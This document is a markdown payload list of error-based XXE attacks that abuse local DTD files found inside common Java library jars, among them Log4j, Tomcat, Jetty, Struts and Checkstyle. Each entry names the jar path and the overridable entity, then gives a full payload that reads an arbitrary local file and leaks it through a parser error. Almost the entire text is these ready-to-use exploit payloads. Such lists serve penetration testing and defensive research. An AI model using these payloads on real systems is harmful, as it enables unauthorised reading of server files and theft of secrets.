# XXE payloads for DTD inside jars (Unknown full path)

**DTD File:** `[HOME_DIR]/.m2/repository/checkstyle/checkstyle/5.0/checkstyle-5.0.jar!/com/puppycrawl/tools/checkstyle/checks/imports/import_control_1_0.dtd`

**Injectable entity:** `%attlist.guard`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file://[HOME_DIR]/.m2/repository/checkstyle/checkstyle/5.0/checkstyle-5.0.jar!/com/puppycrawl/tools/checkstyle/checks/imports/import_control_1_0.dtd">

    <!ENTITY % attlist.guard '>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ELEMENT aa "bb"'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `[HOME_DIR]/.m2/repository/com/openhtmltopdf/openhtmltopdf-core/0.0.1-RC9/openhtmltopdf-core-0.0.1-RC9.jar!/resources/schema/docbook/docbookx.dtd`

**Injectable entity:** `%dbnotn`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file://[HOME_DIR]/.m2/repository/com/openhtmltopdf/openhtmltopdf-core/0.0.1-RC9/openhtmltopdf-core-0.0.1-RC9.jar!/resources/schema/docbook/docbookx.dtd">

    <!ENTITY % dbnotn '
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        '>

    %local_dtd;
]>
<message></message>
```

 --- 


**DTD File:** `[HOME_DIR]/.m2/repository/commons-configuration/commons-configuration/1.10/commons-configuration-1.10.jar!/PropertyList-1.0.dtd`

**Injectable entity:** `%plistObject`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file://[HOME_DIR]/.m2/repository/commons-configuration/commons-configuration/1.10/commons-configuration-1.10.jar!/PropertyList-1.0.dtd">

    <!ENTITY % plistObject '(aa)>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ELEMENT aa "bb"'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `[HOME_DIR]/.m2/repository/commons-digester/commons-digester/1.8.1/commons-digester-1.8.1.jar!/org/apache/commons/digester/xmlrules/digester-rules.dtd`

**Injectable entity:** `%rule-elements`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file://[HOME_DIR]/.m2/repository/commons-digester/commons-digester/1.8.1/commons-digester-1.8.1.jar!/org/apache/commons/digester/xmlrules/digester-rules.dtd">

    <!ENTITY % rule-elements 'aaa)>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ELEMENT aa (bb'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `[HOME_DIR]/.m2/repository/jetty/org.mortbay.jetty/5.1.4/org.mortbay.jetty-5.1.4.jar!/org/mortbay/xml/configure_1_0.dtd`

**Injectable entity:** `%CONFIG`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file://[HOME_DIR]/.m2/repository/jetty/org.mortbay.jetty/5.1.4/org.mortbay.jetty-5.1.4.jar!/org/mortbay/xml/configure_1_0.dtd">

    <!ENTITY % CONFIG 'aaa)>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ELEMENT aa (bb'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `[HOME_DIR]/.m2/repository/org/apache/commons/commons-digester3/3.2/commons-digester3-3.2.jar!/org/apache/commons/digester3/xmlrules/digester-rules.dtd`

**Injectable entity:** `%rule-elements`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file://[HOME_DIR]/.m2/repository/org/apache/commons/commons-digester3/3.2/commons-digester3-3.2.jar!/org/apache/commons/digester3/xmlrules/digester-rules.dtd">

    <!ENTITY % rule-elements 'aaa)>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ELEMENT aa (bb'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `[HOME_DIR]/.m2/repository/org/apache/logging/log4j/log4j-core/2.3/log4j-core-2.3.jar!/Log4j-events.dtd`

**Injectable entity:** `%documentElementAttributes`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file://[HOME_DIR]/.m2/repository/org/apache/logging/log4j/log4j-core/2.3/log4j-core-2.3.jar!/Log4j-events.dtd">

    <!ENTITY % documentElementAttributes '>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ELEMENT aa "bb"'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `[HOME_DIR]/.m2/repository/org/apache/lucene/lucene-queryparser/4.5.1/lucene-queryparser-4.5.1.jar!/org/apache/lucene/queryparser/xml/LuceneCoreQuery.dtd`

**Injectable entity:** `%queries`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file://[HOME_DIR]/.m2/repository/org/apache/lucene/lucene-queryparser/4.5.1/lucene-queryparser-4.5.1.jar!/org/apache/lucene/queryparser/xml/LuceneCoreQuery.dtd">

    <!ENTITY % queries 'aaa)>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ELEMENT aa (bb'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `[HOME_DIR]/.m2/repository/org/apache/struts/struts-core/1.3.10/struts-core-1.3.10.jar!/org/apache/struts/resources/struts-config_1_0.dtd`

**Injectable entity:** `%BeanName`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file://[HOME_DIR]/.m2/repository/org/apache/struts/struts-core/1.3.10/struts-core-1.3.10.jar!/org/apache/struts/resources/struts-config_1_0.dtd">

    <!ENTITY % BeanName '(aa) #IMPLIED>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ATTLIST attxx aa "bb"'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `[HOME_DIR]/.m2/repository/org/apache/struts/struts-tiles/1.3.8/struts-tiles-1.3.8.jar!/org/apache/struts/resources/tiles-config_1_1.dtd`

**Injectable entity:** `%Boolean`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file://[HOME_DIR]/.m2/repository/org/apache/struts/struts-tiles/1.3.8/struts-tiles-1.3.8.jar!/org/apache/struts/resources/tiles-config_1_1.dtd">

    <!ENTITY % Boolean '(aa) #IMPLIED>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ATTLIST attxx aa "bb"'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `[HOME_DIR]/.m2/repository/org/apache/tiles/tiles-core/3.0.5/tiles-core-3.0.5.jar!/org/apache/tiles/resources/tiles-config_3_0.dtd`

**Injectable entity:** `%Boolean`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file://[HOME_DIR]/.m2/repository/org/apache/tiles/tiles-core/3.0.5/tiles-core-3.0.5.jar!/org/apache/tiles/resources/tiles-config_3_0.dtd">

    <!ENTITY % Boolean '(aa) #IMPLIED>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ATTLIST attxx aa "bb"'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `[HOME_DIR]/.m2/repository/org/apache/tomcat/coyote/6.0.29/coyote-6.0.29.jar!/org/apache/tomcat/util/modeler/mbeans-descriptors.dtd`

**Injectable entity:** `%Boolean`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file://[HOME_DIR]/.m2/repository/org/apache/tomcat/coyote/6.0.29/coyote-6.0.29.jar!/org/apache/tomcat/util/modeler/mbeans-descriptors.dtd">

    <!ENTITY % Boolean '(aa) #IMPLIED>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ATTLIST attxx aa "bb"'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `[HOME_DIR]/.m2/repository/org/apache/tomcat/embed/tomcat-embed-core/7.0.47/tomcat-embed-core-7.0.47.jar!/org/apache/tomcat/util/modeler/mbeans-descriptors.dtd`

**Injectable entity:** `%Boolean`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file://[HOME_DIR]/.m2/repository/org/apache/tomcat/embed/tomcat-embed-core/7.0.47/tomcat-embed-core-7.0.47.jar!/org/apache/tomcat/util/modeler/mbeans-descriptors.dtd">

    <!ENTITY % Boolean '(aa) #IMPLIED>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ATTLIST attxx aa "bb"'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `[HOME_DIR]/.m2/repository/org/apache/tomcat/embed/tomcat-embed-jasper/7.0.65/tomcat-embed-jasper-7.0.65.jar!/javax/servlet/jsp/resources/jspxml.dtd`

**Injectable entity:** `%URI`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file://[HOME_DIR]/.m2/repository/org/apache/tomcat/embed/tomcat-embed-jasper/7.0.65/tomcat-embed-jasper-7.0.65.jar!/javax/servlet/jsp/resources/jspxml.dtd">

    <!ENTITY % URI '(aa) #IMPLIED>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ATTLIST attxx aa "bb"'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `[HOME_DIR]/.m2/repository/org/apache/tomcat/tomcat-coyote/7.0.47/tomcat-coyote-7.0.47.jar!/org/apache/tomcat/util/modeler/mbeans-descriptors.dtd`

**Injectable entity:** `%Boolean`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file://[HOME_DIR]/.m2/repository/org/apache/tomcat/tomcat-coyote/7.0.47/tomcat-coyote-7.0.47.jar!/org/apache/tomcat/util/modeler/mbeans-descriptors.dtd">

    <!ENTITY % Boolean '(aa) #IMPLIED>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ATTLIST attxx aa "bb"'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `[HOME_DIR]/.m2/repository/org/apache/tomcat/tomcat-jsp-api/7.0.59/tomcat-jsp-api-7.0.59.jar!/javax/servlet/jsp/resources/jspxml.dtd`

**Injectable entity:** `%URI`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file://[HOME_DIR]/.m2/repository/org/apache/tomcat/tomcat-jsp-api/7.0.59/tomcat-jsp-api-7.0.59.jar!/javax/servlet/jsp/resources/jspxml.dtd">

    <!ENTITY % URI '(aa) #IMPLIED>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ATTLIST attxx aa "bb"'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `[HOME_DIR]/.m2/repository/org/apache/xmlgraphics/batik-svg-dom/1.7/batik-svg-dom-1.7.jar!/org/apache/batik/dom/svg/resources/svg10.dtd`

**Injectable entity:** `%Boolean`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file://[HOME_DIR]/.m2/repository/org/apache/xmlgraphics/batik-svg-dom/1.7/batik-svg-dom-1.7.jar!/org/apache/batik/dom/svg/resources/svg10.dtd">

    <!ENTITY % Boolean '(aa) #IMPLIED>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ATTLIST attxx aa "bb"'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `[HOME_DIR]/.m2/repository/org/codehaus/castor/castor-xml/1.3.3/castor-xml-1.3.3.jar!/org/exolab/castor/dsml/schema/dsml.dtd`

**Injectable entity:** `%distinguished-name`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file://[HOME_DIR]/.m2/repository/org/codehaus/castor/castor-xml/1.3.3/castor-xml-1.3.3.jar!/org/exolab/castor/dsml/schema/dsml.dtd">

    <!ENTITY % distinguished-name '(aa) #IMPLIED>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ATTLIST attxx aa "bb"'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `[HOME_DIR]/.m2/repository/org/eclipse/jetty/jetty-xml/8.1.16.v20140903/jetty-xml-8.1.16.v20140903.jar!/org/eclipse/jetty/xml/configure_6_0.dtd`

**Injectable entity:** `%CONFIG`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file://[HOME_DIR]/.m2/repository/org/eclipse/jetty/jetty-xml/8.1.16.v20140903/jetty-xml-8.1.16.v20140903.jar!/org/eclipse/jetty/xml/configure_6_0.dtd">

    <!ENTITY % CONFIG 'aaa)>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ELEMENT aa (bb'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `[HOME_DIR]/.m2/repository/org/eclipse/jetty/jetty-xml/8.1.16.v20140903/jetty-xml-8.1.16.v20140903.jar!/org/eclipse/jetty/xml/configure_7_6.dtd`

**Injectable entity:** `%CONFIG`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file://[HOME_DIR]/.m2/repository/org/eclipse/jetty/jetty-xml/8.1.16.v20140903/jetty-xml-8.1.16.v20140903.jar!/org/eclipse/jetty/xml/configure_7_6.dtd">

    <!ENTITY % CONFIG 'aaa)>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ELEMENT aa (bb'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `[HOME_DIR]/.m2/repository/org/eclipse/jetty/jetty-xml/9.3.3.v20150827/jetty-xml-9.3.3.v20150827.jar!/org/eclipse/jetty/xml/configure_6_0.dtd`

**Injectable entity:** `%CONFIG`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file://[HOME_DIR]/.m2/repository/org/eclipse/jetty/jetty-xml/9.3.3.v20150827/jetty-xml-9.3.3.v20150827.jar!/org/eclipse/jetty/xml/configure_6_0.dtd">

    <!ENTITY % CONFIG 'aaa)>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ELEMENT aa (bb'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `[HOME_DIR]/.m2/repository/org/eclipse/jetty/jetty-xml/9.3.3.v20150827/jetty-xml-9.3.3.v20150827.jar!/org/eclipse/jetty/xml/configure_9_0.dtd`

**Injectable entity:** `%VALUE`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file://[HOME_DIR]/.m2/repository/org/eclipse/jetty/jetty-xml/9.3.3.v20150827/jetty-xml-9.3.3.v20150827.jar!/org/eclipse/jetty/xml/configure_9_0.dtd">

    <!ENTITY % VALUE 'aaa)>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ELEMENT aa (bb'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `[HOME_DIR]/.m2/repository/org/eclipse/jetty/jetty-xml/9.3.3.v20150827/jetty-xml-9.3.3.v20150827.jar!/org/eclipse/jetty/xml/configure_9_3.dtd`

**Injectable entity:** `%VALUE`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file://[HOME_DIR]/.m2/repository/org/eclipse/jetty/jetty-xml/9.3.3.v20150827/jetty-xml-9.3.3.v20150827.jar!/org/eclipse/jetty/xml/configure_9_3.dtd">

    <!ENTITY % VALUE 'aaa)>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ELEMENT aa (bb'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `[HOME_DIR]/.m2/repository/org/mortbay/jetty/jetty/6.1.14/jetty-6.1.14.jar!/org/mortbay/xml/configure_6_0.dtd`

**Injectable entity:** `%CONFIG`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file://[HOME_DIR]/.m2/repository/org/mortbay/jetty/jetty/6.1.14/jetty-6.1.14.jar!/org/mortbay/xml/configure_6_0.dtd">

    <!ENTITY % CONFIG 'aaa)>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ELEMENT aa (bb'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `[HOME_DIR]/.m2/repository/org/seleniumhq/selenium/selenium-server-standalone/2.46.0/selenium-server-standalone-2.46.0.jar!/org/seleniumhq/jetty7/xml/configure_6_0.dtd`

**Injectable entity:** `%CONFIG`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file://[HOME_DIR]/.m2/repository/org/seleniumhq/selenium/selenium-server-standalone/2.46.0/selenium-server-standalone-2.46.0.jar!/org/seleniumhq/jetty7/xml/configure_6_0.dtd">

    <!ENTITY % CONFIG 'aaa)>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ELEMENT aa (bb'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `[HOME_DIR]/.m2/repository/org/seleniumhq/selenium/selenium-server-standalone/2.46.0/selenium-server-standalone-2.46.0.jar!/org/seleniumhq/jetty7/xml/configure_7_6.dtd`

**Injectable entity:** `%CONFIG`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file://[HOME_DIR]/.m2/repository/org/seleniumhq/selenium/selenium-server-standalone/2.46.0/selenium-server-standalone-2.46.0.jar!/org/seleniumhq/jetty7/xml/configure_7_6.dtd">

    <!ENTITY % CONFIG 'aaa)>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ELEMENT aa (bb'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `[HOME_DIR]/.m2/repository/org/sonarsource/xml/sonar-xml-plugin/1.4.3.1027/sonar-xml-plugin-1.4.3.1027.jar!/org/sonar/plugins/xml/dtd/xhtml1/xhtml1-frameset.dtd`

**Injectable entity:** `%HTMLlat1`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file://[HOME_DIR]/.m2/repository/org/sonarsource/xml/sonar-xml-plugin/1.4.3.1027/sonar-xml-plugin-1.4.3.1027.jar!/org/sonar/plugins/xml/dtd/xhtml1/xhtml1-frameset.dtd">

    <!ENTITY % HTMLlat1 '
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        '>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `[HOME_DIR]/.m2/repository/org/wildfly/wildfly-dist/8.2.1.Final/wildfly-dist-8.2.1.Final.zip!/wildfly-8.2.1.Final/docs/schema/web-facesconfig_1_0.dtd`

**Injectable entity:** `%Language`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file://[HOME_DIR]/.m2/repository/org/wildfly/wildfly-dist/8.2.1.Final/wildfly-dist-8.2.1.Final.zip!/wildfly-8.2.1.Final/docs/schema/web-facesconfig_1_0.dtd">

    <!ENTITY % Language '(aa) #IMPLIED>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ATTLIST attxx aa "bb"'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `[HOME_DIR]/.m2/repository/xml-apis/xml-apis/1.0.b2/xml-apis-1.0.b2-sources.jar!/com/sun/xml/xhtml/resources/xhtml1-frameset.dtd`

**Injectable entity:** `%HTMLlat1`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file://[HOME_DIR]/.m2/repository/xml-apis/xml-apis/1.0.b2/xml-apis-1.0.b2-sources.jar!/com/sun/xml/xhtml/resources/xhtml1-frameset.dtd">

    <!ENTITY % HTMLlat1 '
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        '>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `[HOME_DIR]/.m2/repository/xml-resolver/xml-resolver/1.2/xml-resolver-1.2.jar!/org/apache/xml/resolver/etc/catalog.dtd`

**Injectable entity:** `%publicIdentifier`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file://[HOME_DIR]/.m2/repository/xml-resolver/xml-resolver/1.2/xml-resolver-1.2.jar!/org/apache/xml/resolver/etc/catalog.dtd">

    <!ENTITY % publicIdentifier '(aa) #IMPLIED>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ATTLIST attxx aa "bb"'>

    %local_dtd;
]>
<message></message>
```

 --- 
